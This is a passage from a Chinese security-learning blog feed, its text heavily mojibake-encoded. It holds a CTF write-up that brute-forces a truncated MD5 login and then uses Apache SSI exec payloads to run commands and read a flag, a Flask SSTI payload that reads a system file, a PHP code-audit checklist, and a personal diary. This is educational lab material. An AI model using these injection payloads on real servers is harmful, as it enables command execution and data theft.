&#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">$content &#x3D; uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ˜ å…¥çœ¼å¸˜çš„å°±æ˜¯hashå‡½æ•°</p><p>æ³¨æ„åˆ°ç™»é™†ä»£ç </p><p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>â€‹        è§£é‡Šèµ·æ¥ï¼Œå°±æ˜¯passwordå¿…é¡»hashåŠ å¯†åè¦ç­‰äº6d0bc1ï¼Œæ»¡è¶³åå°±ä¼šè¾“å‡ºscriptå¼¹çª— </p><p>â€˜Welcome to manage systemâ€™</p><p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç›¸åº”çš„shtmlæ–‡ä»¶</p><p>å¼€å§‹è§£é¢˜</p><p>å…ˆå¾—åˆ°è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #çˆ¶ç±»çš„æ„é€ æ–¹æ³•</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘å®Œåï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå¯†ç ç™»å½•</p><p>ç„¶åæŸ¥çœ‹ç½‘ç»œçŠ¶æ€</p><p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>ç”¨è¿™é‡Œçš„è·¯å¾„è®¿é—®ä¸‹</p><p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>çœ‹wpçŸ¥é“äº†åé¢ç”¨sstiæ¨¡æ¿æ³¨å…¥</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p><strong>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong><br>é“¾æ¥ï¼š</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä½¿ç”¨SSI(Server Side Include)çš„htmlæ–‡ä»¶æ‰©å±•åï¼ŒSSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸ºâ€æœåŠ¡å™¨ç«¯åµŒå…¥â€æˆ–è€…å«â€æœåŠ¡å™¨ç«¯åŒ…å«â€ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚</p><p>usernameæˆä¸ºæ³¨å…¥ç‚¹</p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #çœ‹ä¸€ä¸‹ä¸Šå±‚ç›®å½•<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>æ‰¾åˆ°äº†</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä»£ç å®¡è®¡(äºŒ)</title>
      <link href="/2021/09/02/php/0/"/>
      <url>/2021/09/02/php/0/</url>
      
        <content type="html"><![CDATA[<h4 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æœç´¢ move_uploaded_file()å‡½æ•°, åœ¨PHPä¸­ä¸Šä¼ å‡½æ•°åªæœ‰è¿™ä¸€ä¸ª</p><p>2.æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶çš„ä»£ç æ˜¯å¦å­˜åœ¨é™åˆ¶æˆ–å¯ä»¥ç»•è¿‡</p><p>3.æœç´¢includeã€requireã€include_onceã€require_onceå‡½æ•°ï¼Œ</p><p>æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡ã€‚</p><p>4.è¿½è¸ªç¨‹åºè¿è¡Œæµç¨‹ï¼ŒæŸ¥çœ‹æ¨¡å—åŠ è½½æ—¶åŒ…å«çš„æ–‡ä»¶æ˜¯å¦å¯æ§ã€‚</p><p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p><p>ä»»æ„æ–‡ä»¶è¯»å–ã€ä¸‹è½½ã€å†™å…¥ã€åˆ é™¤ã€æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</p><p>é»‘ç›’çœ‹åŠŸèƒ½ç‚¹å¯¹åº”çš„æ–‡ä»¶ï¼Œ å†å»è¯»æ–‡ä»¶</p><p>æœç´¢æ–‡ä»¶è¯»å–çš„å‡½æ•°ï¼Œ æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ç›´æ¥æˆ–è€…ç›´æ¥æ§åˆ¶çš„å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contentsã€highlight_fileã€fopenã€readfileã€freadã€</span><br><span class="line"></span><br><span class="line">fgetssã€fgetsã€parse_ini_fileã€show_sourceã€fileã€fwriteã€</span><br><span class="line"></span><br><span class="line">file_put_contentsã€unlink</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p><h4 id="SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æ‰¾å¯¹åº”åŠŸèƒ½ç‚¹ï¼Œç›´æ¥é»‘ç›’æµ‹è¯•æŸ¥çœ‹æ˜¯å¦èƒ½ç®€å•åˆ©ç”¨ï¼Œä¸èƒ½å†å»è¿½è¸ªæµç¨‹åˆ†æä¼ é€’è¿‡ç¨‹ã€‚</p><p>2.ç™½ç›’æŒ–æ˜åˆ™éœ€è¦æœç´¢å¸¦æœ‰å˜é‡å‚æ•°çš„ç›¸å…³å‡½æ•°</p><p>3.file_get_contents()</p><p>4.fsockopen()</p><p>5.curl_exec()</p><p>6.fopen()</p><p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p><h4 id="ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.å¯»æ‰¾ç›¸å…³ä»£ç çš„æ•æ„Ÿå‡½æ•°ï¼Œ å›æº¯è·Ÿè¸ª</p><p>2.evalã€assertã€preg_repleaceã€$_ GET($_POST[]);</p><p>call_user_funcã€call_user_func_arrayã€array_mapç­‰å‡½æ•°ã€‚</p><p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p><h4 id="å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.å¯»æ‰¾ç›¸å…³ä»£ç çš„æ•æ„Ÿå‡½æ•°ï¼Œå›æº¯è·Ÿè¸ª</p><p>2.systemã€execã€shell_execã€passthru</p><p>åå¼•å·``ã€popenã€ob_startã€pcntl_exec</p><p>proc_open</p><p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p><h4 id="SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.è·Ÿè¸ªå‚æ•°ä¼ é€’æ˜¯å¦å­˜åœ¨è¿‡æ»¤ï¼Œæ•°æ®åº“æŸ¥è¯¢æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘</p><p>2.ä¸€èˆ¬æ•°æ®åº“æŸ¥è¯¢ä¼šè¢«å°è£…åœ¨å‡ ä¸ªæ ¸å¿ƒæ–‡ä»¶ä¸­ï¼Œåå¤è°ƒç”¨ã€‚å½“ç„¶åœ¨æŸäº›å¤æ‚çš„åŠŸèƒ½ä¸­ï¼Œ</p><p>å¯èƒ½ä¹Ÿä¼šå­˜åœ¨ä¸ä½¿ç”¨å°è£…çš„å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦å…¨é¢æ’æŸ¥ã€‚</p><p>3.åœ¨æŒ–æ˜çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿè¦æ³¨æ„å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ç­‰æ–¹æ³•çš„å¯èƒ½æ€§ã€‚</p><p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p><h4 id="XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æŸ¥çœ‹å‚æ•°ä¼ é€’è¿›å…¥åˆ°è¾“å‡ºæ˜¯å¦å­˜åœ¨è¿‡æ»¤å‡½æ•°</p><p>2.å¸¸è§çš„è¾“å‡ºå‡½æ•°ï¼Œprintã€print_rã€echoã€printfã€sprintã€die</p><p>var_dumpã€var_exportç­‰</p><p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p><h4 id="CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æŸ¥çœ‹æäº¤æ•°æ®åŠŸèƒ½ç‚¹ï¼ŒæŠ“åŒ…æŸ¥çœ‹æ˜¯å¦tokenï¼ŒæŸ¥çœ‹æ ¸å¿ƒä»£ç ä¸­æ˜¯å¦å­˜åœ¨tokenæˆ–è€…refereræ ¡éªŒ</p><p>2.å¯ä»¥ç›´æ¥æœç´¢tokenã€refererå…³é”®å­—</p><p>ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</p><p>æœç´¢å¸¦æœ‰å˜é‡å‚æ•°çš„ååºåˆ—åŒ–å‡½æ•°unserliaze()ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨åˆ©ç”¨ç‚¹</p><p>ååºåˆ—åŒ–ä¸­éœ€å…³æ³¨çš„å‡½æ•°</p><p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p><h4 id="installç³»ç»Ÿé‡è£…æ¼æ´"><a href="#installç³»ç»Ÿé‡è£…æ¼æ´" class="headerlink" title="installç³»ç»Ÿé‡è£…æ¼æ´"></a>installç³»ç»Ÿé‡è£…æ¼æ´</h4><p>åœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œ</p><p>éœ€è¦å¡«å†™Webåº”ç”¨çš„æ•°æ®åº“é…ç½®ï¼Œä¸€èˆ¬ä¼šå°†é…ç½®ç›´æ¥å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p><p>åœ¨å†™å…¥çš„è¿‡ç¨‹ä¸­å¾€å¾€æ²¡æœ‰æ ¡éªŒ</p><p>(æœ‰å¯èƒ½å…¶ä»–å®‰è£…åä¿®æ”¹çš„åŠŸèƒ½ä¼šåšæ ¡éªŒ)ï¼Œå¯¼è‡´</p><p>ç›´æ¥å†™å…¥phpä»£ç åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p><p>ä»è€Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„</p><p>installç³»ç»Ÿé‡è£…éªŒè¯ç»•è¿‡æ¼æ´</p><p>æŸäº›CMSçš„installçš„éªŒè¯ä¸ä¸¥è°¨ï¼Œå¯¼è‡´ç›´æ¥ç»•è¿‡é‡è£…ï¼Œä¾‹å¦‚</p><p>1.</p><p>ä½¿ç”¨JavaScriptè·³è½¬ï¼Œä½†æ˜¯åé¢çš„ä»£ç ä»ç„¶ä¼šè¢«æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;ç³»ç»Ÿå·²å®‰è£…è¿‡&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure><p>2.</p><p>ä½¿ç”¨header()</p><p>å‡½æ•°è¿›è¡Œè·³è½¬ï¼Œæ²¡æœ‰ä½¿ç”¨die()</p><p>æˆ–è€…exit()ç»“æŸï¼Œé‚£ä¹ˆåé¢éƒ¨åˆ†çš„ä»£ç ä»ç„¶ä¼š</p><p>è¢«æ‰§è¡Œ</p><p>//header å¤´å¹¶ä¸ä¼šç»“æŸä¹‹åçš„ä»£ç ï¼Œæ¼æ´å‡ºåœ¨è¿™é‡Œ</p><p>header( â€˜location: ../index.phpâ€™);</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020 FlaskApp</title>
      <link href="/2021/09/01/buu/17/"/>
      <url>/2021/09/01/buu/17/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)</a></p><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeoçš„åšå®¢-CSDNåšå®¢</a></p><p>æœ€è¿‘åˆšå­¦äº†æ¨¡æ¿æ³¨å…¥ï¼Œè¿™é¢˜å°±ç›´æ¥é¡ºç€flaskçš„payloadå»</p><p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p><p>è¯•ç€ç”¨ç®€å•çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡åŠ å¯†è§£å¯†æäº¤å</p><p><img src="/2021/09/01/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p><p>å†å°è¯•ç”¨systemå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p><p>å¥½å®¶ä¼™ï¼Œæœç„¶è¢«è¿‡æ»¤äº†</p><p>è¯•äº†å‡ ä¸ªå…³é”®å­—éƒ½ä¸è¡Œåï¼ŒæŸ¥çœ‹æç¤ºï¼Œåœ¨æºç å¤„çœ‹åˆ°</p><p><img src="/2021/09/01/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p><p>çœ‹åˆ°PIN</p><p>æœæ–­ä¸Šç½‘æŸ¥äº†æ–‡ç« ï¼Œå‘ç°PINè¿˜æŒºéš¾å¾—åˆ°çš„</p><p>ä¸»è¦æ˜¯pythonè„šæœ¬ä¸ä¼šå†™ã€‚ã€‚ã€‚</p><p>æ¥ä¸‹æ¥æŒ‰ç…§æ­£å¸¸è§£é¢˜æµç¨‹ï¼š</p><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Daily</title>
      <link href="/2021/09/01/x/q/"/>
      <url>/2021/09/01/x/q/</url>
      
        <content type="html"><![CDATA[<p>â€‹    ä¹‹åè¿™ç¯‡æ–‡ç« å°±æ¥è®°å½•ä¸€äº›æ—¥å¸¸äº†</p><p>9.1</p><p>å¾ˆå¼€å¿ƒå•Šï¼Œæ˜¨å¤©å‘å¸ƒçš„æ–‡ç« åˆ°ä»Šå¤©å°±æœ‰90å¤šä¸ªè®¿é—®é‡</p><p>è€Œä¸”ç™»ä¸Šäº†csdnçš„phpæ¦œç¬¬25åï¼å†æ¥å†å‰ï¼</p><p><img src="/2021/09/01/x/q/image-20210901144059817.png" alt="image-20210901144059817"></p><p>9.2</p><p>æ²¡æƒ³åˆ°ä»£ç å®¡è®¡çš„æ–‡ç« èƒ½åˆ°ç¬¬äº”å</p><p>çœŸæ˜¯æ„å¤–</p><p>è™½ç„¶æµè§ˆé‡ä¸å¤ªé«˜(emm,å†æ¥å†åŠ±å§)</p><p><img src="/2021/09/01/x/q/image-20210902180307061.png" alt="image-20210902180307061"></p><p>9.5</p><p>æœç„¶ä¼šå¿˜è®°è®°å½•å“ˆå“ˆ</p><p>æœ€è¿‘å‘ç°é¢˜ç›®éƒ½ä¸å¤ªå¥½ç†è§£</p><p>ä»£ç å®¡è®¡è¿˜æ˜¯æ¯”è¾ƒéš¾å•Šï¼ŒçœŸçš„å¾ˆæƒ³æŠŠå¼ºç½‘æ¯é‚£é¢˜çœ‹æ‡‚å•Šå•Šå•Š</p><p>9.24</p><p>æ—¥å­è¿‡å¾—å¥½å¿«å•Š</p><p>è½¬çœ¼é—´è¿‡äº†ä¸­ç§‹</p><p>è¦åˆ°äº†å›½åº†</p><p>ä¸çŸ¥é“è‡ªå·±ä»€ä¹ˆæ—¶å€™èƒ½åœ¨æ¯”èµ›ä¸­è§£å‡ºå‡ é“é¢˜ç›®</p>]]></content>
      
      
      
        <tags>
            
            <tag> åˆ†äº« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä»£ç å®¡è®¡(ä¸€)</title>
      <link href="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p> <strong>æ–‡ç« å†…å®¹æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯</strong></p><h3 id="é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š"><a href="#é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š" class="headerlink" title="é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š"></a>é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š</h3><h4 id="1-æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹-é€†å‘è¿½è¸ª"><a href="#1-æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹-é€†å‘è¿½è¸ª" class="headerlink" title="1.æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹(é€†å‘è¿½è¸ª)"></a>1.æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹(é€†å‘è¿½è¸ª)</h4><p>â€‹            æ£€æŸ¥æ•æ„Ÿå‡½æ•°çš„å‚æ•°ï¼Œè¿›è¡Œå›æº¯å˜é‡ï¼Œåˆ¤æ–­å˜é‡æ˜¯å¦å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè¿™æ˜¯ä¸€ä¸ªé€†å‘è¿½è¸ªçš„è¿‡ç¨‹ã€‚</p><h4 id="2-å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹-æ­£å‘è¿½è¸ª"><a href="#2-å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹-æ­£å‘è¿½è¸ª" class="headerlink" title="2.å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹(æ­£å‘è¿½è¸ª)"></a>2.å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹(æ­£å‘è¿½è¸ª)</h4><p>â€‹            è·Ÿè¸ªä¼ é€’çš„å‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦å­˜å…¥åˆ°æ•æ„Ÿå‡½æ•°å†…æˆ–è€…ä¼ é€’çš„è¿‡ç¨‹ä¸­å…·æœ‰ä»£ç é€»è¾‘æ¼æ´ã€‚</p><h4 id="3-å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç -ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´"><a href="#3-å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç -ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´" class="headerlink" title="3.å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç (ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´)"></a>3.å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç (ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´)</h4><p>â€‹            æ ¹æ®è‡ªèº«ç»éªŒåˆ¤æ–­åœ¨è¯¥åº”ç”¨ä¸­çš„å“ªäº›åŠŸèƒ½å¯èƒ½å‡ºç°æ¼æ´ã€‚</p><h4 id="4-ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç "><a href="#4-ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç " class="headerlink" title="4.ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç "></a>4.ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç </h4><h3 id="æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š"><a href="#æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š" class="headerlink" title="æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š"></a>æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š</h3><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103125151.png" alt="image-20210901103125151"></p><h4 id="é€šè¯»å…¨æ–‡ä»£ç "><a href="#é€šè¯»å…¨æ–‡ä»£ç " class="headerlink" title="é€šè¯»å…¨æ–‡ä»£ç "></a>é€šè¯»å…¨æ–‡ä»£ç </h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103255032.png" alt="image-20210901103255032"></p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103436076.png" alt="image-20210901103436076"></p><h3 id="ä¾‹å­ï¼š"><a href="#ä¾‹å­ï¼š" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h3><p>phpå¼±ç±»å‹</p><h4 id="1-æ¯”è¾ƒç¬¦å·"><a 